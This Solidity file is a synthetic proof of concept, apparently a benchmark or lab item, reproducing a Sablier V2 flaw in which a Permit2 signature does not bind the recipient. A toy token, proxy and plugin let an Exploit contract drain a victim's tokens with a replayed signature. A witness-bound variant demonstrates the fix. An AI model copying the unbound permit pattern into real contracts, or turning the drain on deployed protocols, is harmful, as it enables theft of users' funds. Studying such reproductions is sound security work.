// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sablier V2 — a Permit2 allowance signature does not bind the action
    (Cantina / Zach Obront, July 2023). SYNTHETIC, cheatcode-free.
    The permit + transferFrom pair is the blamed pattern (@> VULN).

    Root cause: PermitSingle names the proxy as spender, the token, and the
    amount. It does not name the recipient or the plugin. A caller who can
    make the proxy delegatecall a plugin front-runs the signed permit and
    pulls the tokens to themselves. permitWitnessTransferFrom binds the
    recipient, so the same signature does not pay the attacker. */

contract MiniToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public minter;

    function setMinter(address m) external {
        require(minter == address(0), "minter");
        minter = m;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function seedApproval(address owner, address spender) external {
        require(msg.sender == minter, "minter");
        allowance[owner][spender] = type(uint256).max;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Permit2 {
    struct PermitSingle {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
        address spender;
    }

    bytes32 public constant DETAILS_TYPEHASH =
        keccak256("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)");
    bytes32 public constant SINGLE_TYPEHASH = keccak256(
        "PermitSingle(PermitDetails details,address spender,uint256 sigDeadline)PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"
    );
    bytes32 public constant WITNESS_TYPEHASH = keccak256(
        "PermitWitness(PermitDetails details,address spender,address recipient,uint256 sigDeadline)PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"
    );

    bytes32 public immutable DOMAIN_SEPARATOR;
    mapping(address => mapping(address => mapping(address => uint256))) public allowance;
    mapping(address => mapping(address => mapping(address => uint48))) public nonceOf;

    error BadSignature();
    error WitnessMismatch();

    constructor() {
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)"),
                keccak256("Permit2"),
                uint256(1),
                address(this)
            )
        );
    }

    function permit(address owner, PermitSingle memory permitSingle, uint256 sigDeadline, bytes calldata signature)
        external
    {
        _usePermit(owner, permitSingle, sigDeadline, signature, SINGLE_TYPEHASH, address(0), false);
    }

    function permitWitness(
        address owner,
        PermitSingle memory permitSingle,
        uint256 sigDeadline,
        address recipient,
        bytes calldata signature
    ) external {
        _usePermit(owner, permitSingle, sigDeadline, signature, WITNESS_TYPEHASH, recipient, true);
    }

    function transferFrom(address from, address to, uint160 amount, address token) external {
        uint256 allowed = allowance[from][token][msg.sender];
        require(allowed >= amount, "permit allowance");
        if (allowed != type(uint256).max) allowance[from][token][msg.sender] = allowed - amount;
        require(MiniToken(token).transferFrom(from, to, amount), "pull");
    }

    function _usePermit(
        address owner,
        PermitSingle memory permitSingle,
        uint256 sigDeadline,
        bytes calldata signature,
        bytes32 typehash,
        address recipient,
        bool withWitness
    ) internal {
        require(block.timestamp <= sigDeadline, "deadline");
        require(block.timestamp <= permitSingle.expiration, "expired");
        require(nonceOf[owner][permitSingle.token][permitSingle.spender] == permitSingle.nonce, "nonce");
        bytes32 details = keccak256(
            abi.encode(
                DETAILS_TYPEHASH, permitSingle.token, permitSingle.amount, permitSingle.expiration, permitSingle.nonce
            )
        );
        bytes32 structHash;
        if (withWitness) {
            structHash = keccak256(abi.encode(typehash, details, permitSingle.spender, recipient, sigDeadline));
        } else {
            structHash = keccak256(abi.encode(typehash, details, permitSingle.spender, sigDeadline));
        }
        bytes32 digest = keccak256(abi.encodePacked(hex"1901", DOMAIN_SEPARATOR, structHash));
        address signer = _recover(digest, signature);
        if (signer != owner) {
            if (withWitness) revert WitnessMismatch();
            revert BadSignature();
        }
        nonceOf[owner][permitSingle.token][permitSingle.spender] = permitSingle.nonce + 1;
        allowance[owner][permitSingle.token][permitSingle.spender] = permitSingle.amount;
    }

    function _recover(bytes32 digest, bytes calldata signature) internal pure returns (address) {
        require(signature.length == 65, "sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        if (v < 27) v += 27;
        return ecrecover(digest, v, r, s);
    }
}

contract UserProxy {
    address public owner;

    function init(address _owner) external {
        require(owner == address(0), "init");
        owner = _owner;
    }

    function execute(address target, bytes calldata data) external returns (bytes memory response) {
        require(msg.sender == owner, "owner");
        (bool ok, bytes memory ret) = target.delegatecall(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
        return ret;
    }
}

contract Plugin {
    Permit2 public immutable permit2;
    MiniToken public immutable token;
    address public immutable victim;
    uint256 public constant AMOUNT = 1000 ether;
    uint256 public constant DEADLINE = type(uint256).max;

    constructor(Permit2 _permit2, MiniToken _token, address _victim) {
        permit2 = _permit2;
        token = _token;
        victim = _victim;
    }

    function take(address recipient, bytes calldata signature) external {
        Permit2.PermitSingle memory permitSingle = Permit2.PermitSingle({
            token: address(token),
            amount: uint160(AMOUNT),
            expiration: type(uint48).max,
            nonce: 0,
            spender: address(this)
        });
        // @> VULN: the signature names the proxy, the token, and the amount, not the recipient.
        permit2.permit(victim, permitSingle, DEADLINE, signature);
        permit2.transferFrom(victim, recipient, uint160(AMOUNT), address(token));
    }

    function takeBound(address recipient, bytes calldata signature) external {
        Permit2.PermitSingle memory permitSingle = Permit2.PermitSingle({
            token: address(token),
            amount: uint160(AMOUNT),
            expiration: type(uint48).max,
            nonce: 0,
            spender: address(this)
        });
        permit2.permitWitness(victim, permitSingle, DEADLINE, recipient, signature);
        permit2.transferFrom(victim, recipient, uint160(AMOUNT), address(token));
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;
    address public constant VICTIM = 0x017F6ab319Eb37B718DB89bd08C285c42Dda3A2f;
    address public constant FACTORY = 0x4e59b44847b379578588920cA78FbF26c0B4956C;
    bytes public constant SIG =
        hex"34b7799b2ec72bb18b7aea585c5594f3bdc2195b5a670654738e57373a7c179514cad74cf7ba952cb6e5c3547aa891461edc2ccf38192e00728fda350ee4cf321b";

    MiniToken public token;
    Permit2 public permit2;
    UserProxy public proxy;
    Plugin public plugin;
    uint256 public victimBefore;
    uint256 public attackerGot;
    uint256 public victimAfter;

    constructor() {
        token = MiniToken(_create2(hex"60808060405234601557610461908161001a8239f35b5f80fdfe6080806040526004361015610012575f80fd5b5f3560e01c908163075461721461037957508063095ea7b31461033257806323b872dd1461020057806340c10f19146101af57806370a0823114610178578063a73d602c14610114578063dd62ed3e146100c45763fca3b5aa14610074575f80fd5b346100c05760203660031901126100c05761008d61039c565b600254906100a46001600160a01b038316156103f6565b6001600160a01b03166001600160a01b03199190911617600255005b5f80fd5b346100c05760403660031901126100c0576100dd61039c565b6100e56103b2565b6001600160a01b039182165f908152600160209081526040808320949093168252928352819020549051908152f35b346100c05760403660031901126100c05761012d61039c565b6101356103b2565b9061014b60018060a01b036002541633146103f6565b6001600160a01b039081165f9081526001602090815260408083209490931682529290925290205f199055005b346100c05760203660031901126100c0576001600160a01b0361019961039c565b165f525f602052602060405f2054604051908152f35b346100c05760403660031901126100c0576101c861039c565b6101dd60018060a01b036002541633146103f6565b60018060a01b03165f525f60205260405f206101fc60243582546103e9565b9055005b346100c05760603660031901126100c05761021961039c565b6102216103b2565b6001600160a01b039091165f8181526001602090815260408083203384529091529020546044359291908381106103055783600182016102dc575b5050805f525f6020528260405f2054106102b1575f525f60205260405f206102858382546103c8565b905560018060a01b03165f525f6020526102a460405f209182546103e9565b9055602060405160018152f35b60405162461bcd60e51b815260206004820152600360248201526218985b60ea1b6044820152606490fd5b6102e5916103c8565b5f828152600160209081526040808320338452909152902055838361025c565b60405162461bcd60e51b8152602060048201526005602482015264616c6c6f7760d81b6044820152606490fd5b346100c05760403660031901126100c05761034b61039c565b335f52600160205260405f209060018060a01b03165f5260205260405f206024359055602060405160018152f35b346100c0575f3660031901126100c0576002546001600160a01b03168152602090f35b600435906001600160a01b03821682036100c057565b602435906001600160a01b03821682036100c057565b919082039182116103d557565b634e487b7160e01b5f52601160045260245ffd5b919082018092116103d557565b156103fd57565b60405162461bcd60e51b815260206004820152600660248201526536b4b73a32b960d11b6044820152606490fdfea26469706673582212201497f231a2db94056b8ee383c2bbbb844b3a7426312c981bbee2953b5731d7d564736f6c634300081b0033", bytes32(uint256(1))));
        permit2 = Permit2(_create2(hex"60a0346100bb57602081017f8cad95687ba82c2ce50e74f7b754645e5117c3a5bec8151c0726d5857980a86681527f9ac997416e8ff9d2ff6bebeb7149f65cdae5e32e2b90440b566bb3044041d36a6040830152600160608301523060808301526080825260a082019180831060018060401b038411176100a75782604052519020608052610c8790816100c0823960805181818161036c015281816107940152610ab00152f35b634e487b7160e01b5f52604160045260245ffd5b5f80fdfe6080806040526004361015610012575f80fd5b5f905f3560e01c9081632c03ae6a14610ad3575080633644e51514610a9957806336c78516146108fc57806358be3c99146105e757806379483d6b146105ac57806385ffc695146101a1578063927da10514610134578063a9e165cb146100be5763bed55f3814610081575f80fd5b346100bb57806003193601126100bb5760206040517f65626cad6cb96493bf6f5ebea28756c966f023ab9e8a83a7101849d5573b36788152f35b80fd5b50346100bb5760603660031901126100bb576100d8610b0b565b9060406100e3610b21565b916100ec610b37565b9360018060a01b031681526001602052209060018060a01b03165f5260205260405f209060018060a01b03165f52602052602065ffffffffffff60405f205416604051908152f35b50346100bb5760603660031901126100bb5761014e610b0b565b906040610159610b21565b91610162610b37565b9360018060a01b0316815280602052209060018060a01b03165f5260205260405f209060018060a01b03165f52602052602060405f2054604051908152f35b50346100bb576101203660031901126100bb576101bc610b0b565b6101c536610b83565b60c4359160e4356001600160a01b0381169291908390036105a8576101043567ffffffffffffffff81116105a457610201903690600401610c23565b859195421161057457604084019265ffffffffffff8451164211610545576001600160a01b03908116808952600160209081526040808b20885185165f90815290835281812060808a01805190961682529092529020546060870180519299939890959092909165ffffffffffff9081169116036105185760419160018060a01b03885116602089019765ffffffffffff60018060a01b038a511691511665ffffffffffff895116906040519260208401947f65626cad6cb96493bf6f5ebea28756c966f023ab9e8a83a7101849d5573b3678865260408501526060840152608083015260a082015260a081526102f960c082610b4d565b5190209160018060a01b038a5116916040519260208401947fd4ca4a86caf76b9c479980e329c98c5601ec69b2ba4b83dfe46ddf3ed51aa25f865260408501526060840152608083015260a082015260a0815261035760c082610b4d565b519020604051602081019161190160f01b83527f000000000000000000000000000000000000000000000000000000000000000060228301526042820152604281526103a4606282610b4d565b51902092036104e95787906040810135821a601b81106104bf575b92602060809260ff82966040519485521682840152803560408401520135606082015282805260015afa156104b45785516001600160a01b03168590036104a55765ffffffffffff60019151160165ffffffffffff81116104915784865260016020908152604080882085516001600160a01b039081165f9081529184528282208851821683528452828220805465ffffffffffff191665ffffffffffff9690961695909517909455935196885287825280882094518316845293815283832094518216835293909352209116905580f35b634e487b7160e01b86526011600452602486fd5b6301e06d7360e61b8652600486fd5b6040513d87823e3d90fd5b601b9192500160ff81116104d5578891906103bf565b634e487b7160e01b89526011600452602489fd5b60405162461bcd60e51b815260206004820152600760248201526639b4b3903632b760c91b6044820152606490fd5b60405162461bcd60e51b81526020600482015260056024820152646e6f6e636560d81b6044820152606490fd5b60405162461bcd60e51b8152602060048201526007602482015266195e1c1a5c995960ca1b6044820152606490fd5b60405162461bcd60e51b8152602060048201526008602482015267646561646c696e6560c01b6044820152606490fd5b8580fd5b8480fd5b50346100bb57806003193601126100bb5760206040517ff3841cd1ff0085026a6327b620b67997ce40f282c88a8e905a7a5626e310f3d08152f35b50346108f8576101003660031901126108f857610602610b0b565b61060b36610b83565b60c4359060e43567ffffffffffffffff81116108f85761062f903690600401610c23565b93909280421161057457604083019165ffffffffffff8351164211610545576001600160a01b039081165f818152600160209081526040808320885186168452825280832060808901805190961684529091529020546060860180519298939790949092909165ffffffffffff9081169116036105185760419060018060a01b03875116602088019665ffffffffffff60018060a01b0389511691511665ffffffffffff885116906040519260208401947f65626cad6cb96493bf6f5ebea28756c966f023ab9e8a83a7101849d5573b3678865260408501526060840152608083015260a082015260a0815261072660c082610b4d565b5190209060018060a01b03895116906040519160208301937ff3841cd1ff0085026a6327b620b67997ce40f282c88a8e905a7a5626e310f3d085526040840152606083015260808201526080815261077f60a082610b4d565b519020604051602081019161190160f01b83527f000000000000000000000000000000000000000000000000000000000000000060228301526042820152604281526107cc606282610b4d565b51902092036104e95760408101355f1a601b81106108d2575b602092835f9360ff6080946040519485521682840152803560408401520135606082015282805260015afa156108c7575f516001600160a01b03168590036108b85765ffffffffffff60019151160165ffffffffffff81116104915784865260016020908152604080882085516001600160a01b039081165f9081529184528282208851821683528452828220805465ffffffffffff191665ffffffffffff9690961695909517909455935196885287825280882094518316845293815283832094518216835293909352209116905580f35b635cd5d23360e01b5f5260045ffd5b6040513d5f823e3d90fd5b601b019060ff82116108e457906107e5565b634e487b7160e01b5f52601160045260245ffd5b5f80fd5b346108f85760803660031901126108f857610915610b0b565b61091d610b21565b90610926610b37565b916064356001600160a01b03811692908390036108f8576001600160a01b039081165f8181526020818152604080832087845282528083203384529091529020549490911693909290848110610a615760018101610a2e575b506020925f60649260405196879586946323b872dd60e01b8652600486015260018060a01b0316602485015260448401525af19081156108c7575f916109f3575b50156109c857005b606460405162461bcd60e51b81526020600482015260046024820152631c1d5b1b60e21b6044820152fd5b90506020813d602011610a26575b81610a0e60209383610b4d565b810103126108f8575180151581036108f857816109c0565b3d9150610a01565b928484039384116108e4575f8181526020818152604080832085845282528083203384528252909120949094559261097f565b60405162461bcd60e51b815260206004820152601060248201526f7065726d697420616c6c6f77616e636560801b6044820152606490fd5b346108f8575f3660031901126108f85760206040517f00000000000000000000000000000000000000000000000000000000000000008152f35b346108f8575f3660031901126108f857807fd4ca4a86caf76b9c479980e329c98c5601ec69b2ba4b83dfe46ddf3ed51aa25f60209252f35b600435906001600160a01b03821682036108f857565b602435906001600160a01b03821682036108f857565b604435906001600160a01b03821682036108f857565b90601f8019910116810190811067ffffffffffffffff821117610b6f57604052565b634e487b7160e01b5f52604160045260245ffd5b60a09060231901126108f8576040519060a0820182811067ffffffffffffffff821117610b6f57604052816024356001600160a01b03811681036108f85781526044356001600160a01b03811681036108f857602082015260643565ffffffffffff811681036108f857604082015260843565ffffffffffff811681036108f857606082015260a435906001600160a01b03821682036108f85760800152565b9181601f840112156108f85782359167ffffffffffffffff83116108f857602083818601950101116108f85756fea2646970667358221220920d4adaac09b7a866c2b9a3644a0cec10626460b64ec383bc32afbd07737be864736f6c634300081b0033", bytes32(uint256(2))));
        proxy = UserProxy(_create2(hex"60808060405234601557610297908161001a8239f35b5f80fdfe60806040526004361015610011575f80fd5b5f3560e01c806319ab453c146100445780631cff79cd1461003f57638da5cb5b1461003a575f80fd5b610169565b6100f2565b346100ae5760203660031901126100ae5761005d6100b2565b5f54906001600160a01b038216610089576001600160a01b03166001600160a01b031991909116175f55005b62461bcd60e51b6080526020608452600460a452631a5b9a5d60e21b60c45260646080fd5b5f80fd5b600435906001600160a01b03821682036100ae57565b602060409281835280519182918282860152018484015e5f828201840152601f01601f1916010190565b346100ae5760403660031901126100ae5761010b6100b2565b60243567ffffffffffffffff81116100ae57366023820112156100ae57806004013567ffffffffffffffff81116100ae5736602482840101116100ae576101659260246101599301906101a4565b604051918291826100c8565b0390f35b346100ae575f3660031901126100ae575f546040516001600160a01b039091168152602090f35b634e487b7160e01b5f52604160045260245ffd5b5f546001600160a01b0316330361023457825f939284936040519283928337810184815203915af43d1561022c573d9067ffffffffffffffff82116102275760405191601f8101601f19908116603f0116830167ffffffffffffffff8111848210176102275760405282523d5f602084013e5b1561021f5790565b602081519101fd5b610190565b606090610217565b60405162461bcd60e51b815260206004820152600560248201526437bbb732b960d91b6044820152606490fdfea2646970667358221220edde30c9458f3e96e1ac40c98b033adf61cd84fd91eb5d5dadda3700174ca53d64736f6c634300081b0033", bytes32(uint256(3))));
        token.setMinter(address(this));
        proxy.init(address(this));
        plugin = new Plugin(permit2, token, VICTIM);
    }

    function run() external {
        token.mint(VICTIM, AMOUNT);
        token.seedApproval(VICTIM, address(permit2));
        victimBefore = token.balanceOf(VICTIM);
        proxy.execute(address(plugin), abi.encodeCall(Plugin.take, (msg.sender, SIG)));
        attackerGot = token.balanceOf(msg.sender);
        victimAfter = token.balanceOf(VICTIM);
        require(victimBefore == AMOUNT, "victim was not funded");
        require(attackerGot == AMOUNT, "attacker did not pull 1000");
        require(victimAfter == 0, "victim still holds tokens");
    }

    function mintVictim() external {
        token.mint(VICTIM, AMOUNT);
        token.seedApproval(VICTIM, address(permit2));
    }

    function pullBound(address recipient) external {
        proxy.execute(address(plugin), abi.encodeCall(Plugin.takeBound, (recipient, SIG)));
    }

    function _create2(bytes memory initCode, bytes32 salt) internal returns (address addr) {
        bytes memory data = abi.encodePacked(salt, initCode);
        (bool ok, bytes memory ret) = FACTORY.call(data);
        require(ok && ret.length == 20, "create2");
        addr = address(bytes20(ret));
    }
}
